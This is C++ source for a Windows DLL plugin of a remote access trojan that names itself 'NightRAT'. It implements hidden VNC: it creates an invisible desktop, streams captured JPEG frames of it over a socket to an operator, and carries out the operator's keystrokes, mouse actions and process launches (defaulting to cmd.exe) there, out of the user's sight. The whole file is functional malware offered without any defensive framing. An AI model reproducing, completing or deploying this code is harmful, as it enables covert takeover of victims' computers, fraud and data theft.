#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <condition_variable>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 20;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Frame Worker
struct CapturedFrame {
    HBITMAP hBmp;
    int sw, sh;
    int dw, dh;
    int scale;
    int quality;
    int cursorShape;
};
static queue<CapturedFrame> g_frameQueue;
static mutex g_frameMutex;
static condition_variable g_frameCV;
static thread g_frameThread;
static atomic_bool g_frameRunning(false);

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static queue<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

// ---------- Drag state ----------
static HWND  g_dragHwnd     = NULL;
static POINT g_dragStartPt  = {0, 0};
static RECT  g_dragStartRect = {0, 0, 0, 0};
static bool  g_dragging     = false;
static LRESULT g_dragHitTest = HTCLIENT;
static HWND  g_hLastWindow  = NULL;
static HWND  g_hCurrentFocus = NULL;

// -----------------------------------------------------------------------

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes, int cursorShape) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor  = (uint32_t)cursorShape; // Use monitor field for cursor shape as a trick or just send separate JSON
    frameHeader.scale    = (uint32_t)scale;
    frameHeader.fps      = (uint32_t)fps;
    frameHeader.width    = (uint32_t)width;
    frameHeader.height   = (uint32_t)height;
    frameHeader.format   = FRAME_FORMAT_JPEG;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type      = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size      = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg_scaled(HBITMAP hBmp, int dw, int dh, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    CLSID clsid;
    if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;

    Bitmap source(hBmp, NULL);
    Bitmap* target = &source;
    bool scaled = false;

    if (source.GetWidth() != (UINT)dw || source.GetHeight() != (UINT)dh) {
        target = new Bitmap(dw, dh, PixelFormat32bppARGB);
        Graphics g(target);
        g.SetInterpolationMode(InterpolationModeBilinear); // Faster than bicubic, still good
        g.DrawImage(&source, 0, 0, dw, dh);
        scaled = true;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
        EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = EncoderQuality;
        params.Parameter[0].Type = EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        params.Parameter[0].Value = &quality;

        if (target->Save(stream, &clsid, &params) == Ok) {
            STATSTG stat;
            stream->Stat(&stat, STATFLAG_NONAME);
            bytes.resize((size_t)stat.cbSize.QuadPart);
            LARGE_INTEGER li = {0};
            stream->Seek(li, STREAM_SEEK_SET, NULL);
            ULONG read;
            stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
        }
        stream->Release();
    }

    if (scaled) delete target;
    return !bytes.empty();
}

static void frame_worker_loop() {
    while (g_frameRunning) {
        CapturedFrame frame;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_frameQueue.empty() || !g_frameRunning; });
            if (!g_frameRunning && g_frameQueue.empty()) break;
            frame = g_frameQueue.front();
            g_frameQueue.pop();
        }

        vector<unsigned char> jpeg;
        if (bitmap_to_jpeg_scaled(frame.hBmp, frame.dw, frame.dh, (ULONG)frame.quality, jpeg)) {
            safe_send_hvnc_frame(g_socket, frame.scale, g_targetFps, frame.dw, frame.dh, jpeg, frame.cursorShape);
        }
        DeleteObject(frame.hBmp);
    }
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;
    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
}

// Window compositing helper
struct WindowInfo {
    HWND hwnd;
    RECT rect;
};

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    vector<WindowInfo>* windows = (vector<WindowInfo>*)lParam;
    RECT rect;
    if (GetWindowRect(hwnd, &rect)) {
        windows->push_back({hwnd, rect});
    }
    return TRUE;
}

static int GetCursorShape(HCURSOR hCursor) {
    if (hCursor == LoadCursor(NULL, IDC_ARROW)) return 1;
    if (hCursor == LoadCursor(NULL, IDC_IBEAM)) return 2;
    if (hCursor == LoadCursor(NULL, IDC_WAIT)) return 3;
    if (hCursor == LoadCursor(NULL, IDC_CROSS)) return 4;
    if (hCursor == LoadCursor(NULL, IDC_UPARROW)) return 5;
    if (hCursor == LoadCursor(NULL, IDC_SIZE)) return 6;
    if (hCursor == LoadCursor(NULL, IDC_ICON)) return 7;
    if (hCursor == LoadCursor(NULL, IDC_SIZENWSE)) return 8;
    if (hCursor == LoadCursor(NULL, IDC_SIZENESW)) return 9;
    if (hCursor == LoadCursor(NULL, IDC_SIZEWE)) return 10;
    if (hCursor == LoadCursor(NULL, IDC_SIZENS)) return 11;
    if (hCursor == LoadCursor(NULL, IDC_SIZEALL)) return 12;
    if (hCursor == LoadCursor(NULL, IDC_NO)) return 13;
    if (hCursor == LoadCursor(NULL, IDC_HAND)) return 14;
    if (hCursor == LoadCursor(NULL, IDC_APPSTARTING)) return 15;
    if (hCursor == LoadCursor(NULL, IDC_HELP)) return 16;
    return 0;
}

static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop || !SetThreadDesktop(g_hHiddenDesktop)) {
        g_captureRunning = false;
        return;
    }

    int lastSw = 0, lastSh = 0;
    HDC hdcScreen = NULL;
    HDC hdcMem = NULL;
    HBITMAP hbmpMem = NULL;
    HDC hdcWin = NULL;

    vector<WindowInfo> windows;
    int enumCounter = 0;

    while (g_captureRunning) {
        DWORD start = GetTickCount();
        int scale, quality;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            quality = g_scalePercent;
        }

        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        if (sw != lastSw || sh != lastSh || !hdcScreen) {
            if (hdcWin) DeleteDC(hdcWin);
            if (hbmpMem) DeleteObject(hbmpMem);
            if (hdcMem) DeleteDC(hdcMem);
            if (hdcScreen) ReleaseDC(NULL, hdcScreen);

            hdcScreen = GetDC(NULL);
            hdcMem = CreateCompatibleDC(hdcScreen);
            hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
            hdcWin = CreateCompatibleDC(hdcScreen);
            lastSw = sw; lastSh = sh;
        }

        HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
        RECT fullRect = { 0, 0, sw, sh };
        FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

        if (enumCounter <= 0) {
            windows.clear();
            EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
            reverse(windows.begin(), windows.end());
            enumCounter = 20; // Every 20 frames for Z-order
        }
        enumCounter--;

        for (auto& win : windows) {
            if (!IsWindow(win.hwnd) || !IsWindowVisible(win.hwnd)) continue;
            GetWindowRect(win.hwnd, &win.rect); // Update rect every frame
            int ww = win.rect.right - win.rect.left;
            int wh = win.rect.bottom - win.rect.top;
            if (ww <= 0 || wh <= 0) continue;

            HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
            HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);

            if (!PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
                HDC hdcRealWin = GetWindowDC(win.hwnd);
                if (hdcRealWin) {
                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                    ReleaseDC(win.hwnd, hdcRealWin);
                }
            }
            BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);

            SelectObject(hdcWin, hOldWin);
            DeleteObject(hbmpWin);
        }

        // Cursor handling
        int cursorShape = 0;
        CURSORINFO ci = { sizeof(CURSORINFO) };
        if (GetCursorInfo(&ci) && (ci.flags & CURSOR_SHOWING)) {
            cursorShape = GetCursorShape(ci.hCursor);
            ICONINFO ii = { 0 };
            if (GetIconInfo(ci.hCursor, &ii)) {
                DrawIcon(hdcMem, ci.ptScreenPos.x - ii.xHotspot, ci.ptScreenPos.y - ii.yHotspot, ci.hCursor);
                if (ii.hbmMask) DeleteObject(ii.hbmMask);
                if (ii.hbmColor) DeleteObject(ii.hbmColor);
            }
        }

        int dw = (sw * scale) / 100;
        int dh = (sh * scale) / 100;
        if (dw < 1) dw = 1; if (dh < 1) dh = 1;

        HBITMAP hbmpWork = CreateCompatibleBitmap(hdcScreen, sw, sh);
        HDC hdcWork = CreateCompatibleDC(hdcScreen);
        HGDIOBJ hOldWork = SelectObject(hdcWork, hbmpWork);
        BitBlt(hdcWork, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
        SelectObject(hdcWork, hOldWork);
        DeleteDC(hdcWork);

        CapturedFrame cf;
        cf.hBmp = hbmpWork;
        cf.sw = sw; cf.sh = sh;
        cf.dw = dw; cf.dh = dh;
        cf.scale = scale;
        cf.quality = quality;
        cf.cursorShape = cursorShape;

        {
            lock_guard<mutex> lock(g_frameMutex);
            while (g_frameQueue.size() >= 2) {
                CapturedFrame old = g_frameQueue.front();
                g_frameQueue.pop();
                DeleteObject(old.hBmp);
            }
            g_frameQueue.push(cf);
            g_frameCV.notify_one();
        }

        SelectObject(hdcMem, hOldMem);

        DWORD elapsed = GetTickCount() - start;
        DWORD interval = 1000 / (g_targetFps > 0 ? g_targetFps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }

    if (hdcWin) DeleteDC(hdcWin);
    if (hbmpMem) DeleteObject(hbmpMem);
    if (hdcMem) DeleteDC(hdcMem);
    if (hdcScreen) ReleaseDC(NULL, hdcScreen);
}

// -----------------------------------------------------------------------
static POINT screen_pt(int normX, int normY) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    POINT pt;
    pt.x = (normX * sw) / 65535;
    pt.y = (normY * sh) / 65535;
    return pt;
}

static HWND GetFocusedWindow() {
    HWND hTarget = g_hCurrentFocus;
    if (!hTarget) hTarget = GetForegroundWindow();
    if (!hTarget) hTarget = g_hLastWindow;
    if (!hTarget) return NULL;

    DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
    if (GetGUIThreadInfo(threadId, &gti)) {
        if (gti.hwndFocus) return gti.hwndFocus;
        if (gti.hwndCaret) return gti.hwndCaret;
    }
    return hTarget;
}

static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop || !SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning && g_inputQueue.empty()) break;
            task = g_inputQueue.front();
            g_inputQueue.pop();
        }

        const string& action = task.action;
        const json&   cmd    = task.cmd;

        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            int vk = cmd.value("keycode", 0);
            HWND hTarget = GetFocusedWindow();
            if (!hTarget) continue;

            if (action == "hvnc_keydown") PostMessageW(hTarget, WM_KEYDOWN, vk, 0x00000001);
            else if (action == "hvnc_keyup") PostMessageW(hTarget, WM_KEYUP, vk, 0xC0000001);
            else if (action == "hvnc_char") PostMessageW(hTarget, WM_CHAR, vk, 0x00000001);
            continue;
        }

        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;

        int normX = cmd.value("x", 0);
        int normY = cmd.value("y", 0);
        POINT screenPt = screen_pt(normX, normY);

        if (action == "hvnc_mousemove") {
            if (g_dragging && g_dragHwnd) {
                int dx = screenPt.x - g_dragStartPt.x;
                int dy = screenPt.y - g_dragStartPt.y;

                if (g_dragHitTest == HTCAPTION) {
                    SetWindowPos(g_dragHwnd, NULL, g_dragStartRect.left + dx, g_dragStartRect.top + dy, 0, 0,
                                 SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                } else {
                    RECT rc = g_dragStartRect;
                    int w = rc.right - rc.left, h = rc.bottom - rc.top;
                    switch (g_dragHitTest) {
                        case HTRIGHT: w += dx; break;
                        case HTBOTTOM: h += dy; break;
                        case HTBOTTOMRIGHT: w += dx; h += dy; break;
                        case HTLEFT: rc.left += dx; w -= dx; break;
                        case HTTOP: rc.top += dy; h -= dy; break;
                        case HTTOPLEFT: rc.left += dx; w -= dx; rc.top += dy; h -= dy; break;
                        case HTTOPRIGHT: w += dx; rc.top += dy; h -= dy; break;
                        case HTBOTTOMLEFT: rc.left += dx; w -= dx; h += dy; break;
                    }
                    if (w < 100) w = 100; if (h < 50) h = 50;
                    SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h, SWP_NOZORDER | SWP_NOACTIVATE);
                }
            } else {
                HWND hwnd = WindowFromPoint(screenPt);
                if (hwnd) {
                    LRESULT ht;
                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
                        if (ht == HTCLIENT) {
                            POINT cpt = screenPt; ScreenToClient(hwnd, &cpt);
                            PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(cpt.x, cpt.y));
                        } else {
                            PostMessageW(hwnd, WM_NCMOUSEMOVE, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
                        }
                    }
                }
            }
            continue;
        }

        if (action == "hvnc_mousedown") {
            int btn = cmd.value("button", 0);
            HWND hwnd = WindowFromPoint(screenPt);
            if (!hwnd) continue;

            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
            g_hLastWindow = hRoot;

            LRESULT ht;
            if (!SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht))
                ht = HTCLIENT;

            if (GetForegroundWindow() != hRoot) {
                AllowSetForegroundWindow(ASFW_ANY);
                SetForegroundWindow(hRoot);
                BringWindowToTop(hRoot);
            }
            g_hCurrentFocus = (ht == HTCLIENT) ? hwnd : hRoot;

            if (ht != HTCLIENT) {
                if (btn == 0) {
                    if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
                    if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
                    if (ht == HTMAXBUTTON) {
                        WINDOWPLACEMENT wp = { sizeof(wp) }; GetWindowPlacement(hRoot, &wp);
                        PostMessageW(hRoot, WM_SYSCOMMAND, (wp.showCmd == SW_SHOWMAXIMIZED) ? SC_RESTORE : SC_MAXIMIZE, 0);
                        continue;
                    }
                    if (ht == HTCAPTION || (ht >= HTLEFT && ht <= HTBOTTOMRIGHT)) {
                        g_dragging = true; g_dragHwnd = hRoot; g_dragStartPt = screenPt; g_dragHitTest = ht;
                        GetWindowRect(hRoot, &g_dragStartRect);
                    }
                }
                UINT ncMsg = (btn == 1) ? WM_NCRBUTTONDOWN : (btn == 2 ? WM_NCMBUTTONDOWN : WM_NCLBUTTONDOWN);
                PostMessageW(hwnd, ncMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
            } else {
                POINT cpt = screenPt; ScreenToClient(hwnd, &cpt);
                UINT msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
                WPARAM wp = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
                PostMessageW(hwnd, msg, wp, MAKELPARAM(cpt.x, cpt.y));
            }
            continue;
        }

        if (action == "hvnc_mouseup") {
            int btn = cmd.value("button", 0);
            if (btn == 0 && g_dragging) { g_dragging = false; g_dragHwnd = NULL; }
            HWND hwnd = WindowFromPoint(screenPt);
            if (!hwnd) continue;
            LRESULT ht;
            if (!SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) ht = HTCLIENT;
            if (ht != HTCLIENT) {
                UINT ncMsg = (btn == 1) ? WM_NCRBUTTONUP : (btn == 2 ? WM_NCMBUTTONUP : WM_NCLBUTTONUP);
                PostMessageW(hwnd, ncMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
            } else {
                POINT cpt = screenPt; ScreenToClient(hwnd, &cpt);
                UINT msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
                PostMessageW(hwnd, msg, 0, MAKELPARAM(cpt.x, cpt.y));
            }
            continue;
        }

        if (action == "hvnc_doubleclick") {
            int btn = cmd.value("button", 0);
            HWND hwnd = WindowFromPoint(screenPt);
            if (!hwnd) continue;
            POINT cpt = screenPt; ScreenToClient(hwnd, &cpt);
            UINT msg = (btn == 0) ? WM_LBUTTONDBLCLK : (btn == 1 ? WM_RBUTTONDBLCLK : WM_MBUTTONDBLCLK);
            PostMessageW(hwnd, msg, 0, MAKELPARAM(cpt.x, cpt.y));
            continue;
        }
    }
}

static wstring utf8_to_wstring(const string& str) {
    if (str.empty()) return wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return wstring();
    wstring res(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    g_socket = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json cmd = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (!g_frameRunning.exchange(true)) {
                if (g_frameThread.joinable()) g_frameThread.join();
                g_frameThread = thread(frame_worker_loop);
            }
            if (!g_captureRunning.exchange(true)) {
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            if (!g_inputRunning.exchange(true)) {
                if (g_inputThread.joinable()) g_inputThread.join();
                g_inputThread = thread(input_loop);
            }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            g_inputRunning = false;
            g_frameRunning = false;
            g_inputCV.notify_all();
            g_frameCV.notify_all();
            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_inputThread.joinable()) g_inputThread.join();
            if (g_frameThread.joinable()) g_frameThread.join();
        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
        } else if (action == "hvnc_run") {
            ensure_desktop();
            if (!g_hHiddenDesktop) return;
            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
            vector<wchar_t> cmdLine(path.begin(), path.end()); cmdLine.push_back(L'\0');
            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
            STARTUPINFOW si = { sizeof(si) };
            si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
            PROCESS_INFORMATION pi = { 0 };
            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                send_status("Process started on hidden desktop");
            } else {
                send_error("Failed to start process. Error: " + to_string(GetLastError()));
            }
        } else {
            lock_guard<mutex> lock(g_inputMutex);
            g_inputQueue.push({action, cmd});
            g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false; g_inputRunning = false; g_frameRunning = false;
        g_inputCV.notify_all(); g_frameCV.notify_all();
    }
    return TRUE;
}